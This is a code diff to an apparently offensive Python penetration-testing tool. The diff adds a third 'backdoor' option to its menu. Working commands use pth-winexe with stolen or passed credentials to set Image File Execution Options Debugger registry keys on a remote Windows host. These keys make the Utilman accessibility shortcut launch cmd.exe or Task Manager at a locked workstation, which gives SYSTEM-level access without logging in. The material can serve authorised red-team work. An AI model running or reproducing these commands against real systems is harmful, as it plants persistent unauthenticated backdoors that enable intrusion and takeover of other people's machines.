@@ -2898,10 +2898,11 @@ if edq_backdoor!='n':
 			if edq_backdoor=='e':
 				print colored("\n[+]IMPORTANT - Remeber to remove when finished with\n",'red')
 
-				print colored("[+]BACKDOOR 1: Sticky Keys - Activate by pressing left shift multiple times at a Locked workstation",'green')
-				print colored("[+]BACKDOOR 2: Utilman - Activate with Windows Key + U at a Locked Workstation\n",'green')
+				print colored("[+]BACKDOOR 1: Sticky Keys - Activate by pressing left shift multiple times at a Locked workstation to stard cmd.exe",'green')
+				print colored("[+]BACKDOOR 2: Utilman - Activate with Windows Key + U at a Locked Workstation to stard cmd.exe",'green')
+				print colored("[+]BACKDOOR 3: Utilman Variation - Launch Taskmanager at a Locked Workstation using Windows Key + U\n",'green')
 
-				response = raw_input("Which Backdoor would you like to set? (1,2): ")
+				response = raw_input("Which Backdoor would you like to set? (1,2,3): ")
 
 				if response =="1":
 					print colored("[+]Enabling BACKDOOR 1: Sticky Keys",'green')
@@ -2912,6 +2913,11 @@ if edq_backdoor!='n':
 					print colored("[+]Enabling BACKDOOR 2: Utilman",'green')
 					print colored("[+]To use press Windows Key + U at a Locked Workstation:",'yellow')
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
+					sys.exit()
+				elif response=="3":
+					print colored("[+]Enabling BACKDOOR 3: TaskManager",'green')
+					print colored("[+]To use press Windows Key + U at a Locked Workstation:",'yellow')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\\taskmgr.exe\" /f' 2>/dev/null")
 					sys.exit()
 				
 				sys.exit()
